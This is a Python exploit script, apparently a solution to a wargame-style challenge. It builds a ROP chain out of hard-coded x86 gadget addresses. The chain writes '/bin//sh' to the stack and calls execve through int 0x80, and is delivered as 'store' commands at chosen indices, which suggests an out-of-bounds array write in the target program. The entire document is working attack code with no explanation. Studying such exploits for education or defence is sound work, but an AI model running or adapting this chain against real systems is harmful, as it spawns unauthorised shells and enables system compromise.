from struct import unpack
import sys

stack_addr    = unpack(">L", b'\xbf\xff\xf5\x4c')[0]  # stack_addr
move          = unpack(">L", b'\x08\x0a\x2c\xcd')[0]  # mov dword ptr [edx], eax | ret
add_a         = unpack(">L", b'\x08\x09\x6f\x82')[0]  # add eax, 0xb | pop edi | ret
xor_a         = unpack(">L", b'\x08\x05\x4c\x30')[0]  # xor eax, eax | ret
int_80        = unpack(">L", b'\x08\x04\x8e\xaa')[0]  # int 0x80
pop_b         = unpack(">L", b'\x08\x04\x81\xc9')[0]  # pop ebx | ret
pop_c         = unpack(">L", b'\x08\x0e\x62\x55')[0]  # pop ecx | ret
pop_d         = unpack(">L", b'\x08\x06\xf3\xaa')[0]  # pop edx | ret
pop_c_b       = unpack(">L", b'\x08\x06\xf3\xd1')[0]  # pop ecx | pop ebx | ret
pop_d_b       = unpack(">L", b'\x08\x06\xf3\xa9')[0]  # pop ebx | pop edx | ret
pop_s_d_b     = unpack(">L", b'\x08\x05\x5b\x68')[0]  # pop esi | pop edi | pop ebp | ret
pop_s_a_b_s_d = unpack(">L", b'\x08\x0a\x65\xe9')[0]  # pop es  | pop eax | pop ebx | pop esi | pop edi | ret

index_mass = [i for i in range(-7, 38) if i % 3 != 0 and i != -1 and i != 11 and i != 13 and i != 23 and i != 25]
index_mass.append(-11)

shellcode = [pop_b,           xor_a,          # -7, -5
             pop_c,           pop_c_b,        # -4, -2
             xor_a,           pop_c,          #  1,  2
             xor_a,           pop_d_b,        #  4,  5
             stack_addr+0xb0, pop_s_a_b_s_d,  #  7,  8
             0x6e69622f,      pop_c,          # 10, 14
             move,            pop_d_b,        # 16, 17
             stack_addr+0xb4, pop_s_a_b_s_d,  # 19, 20
             0x68732f2f,      pop_b,          # 22, 26
             move,            pop_c_b,        # 28, 29
             stack_addr+0xb0, pop_d,          # 31, 32
             xor_a,           add_a,          # 34, 35
             int_80,                          # 37
             pop_s_d_b                        # -11
             ]

buf = ''
for i in range(len(shellcode)):
    buf += "store\n"
    buf += str(shellcode[i])
    buf += "\n"
    buf += str(index_mass[i])
    buf += "\n"

buf += "quit\n"
sys.stdout.write(buf)
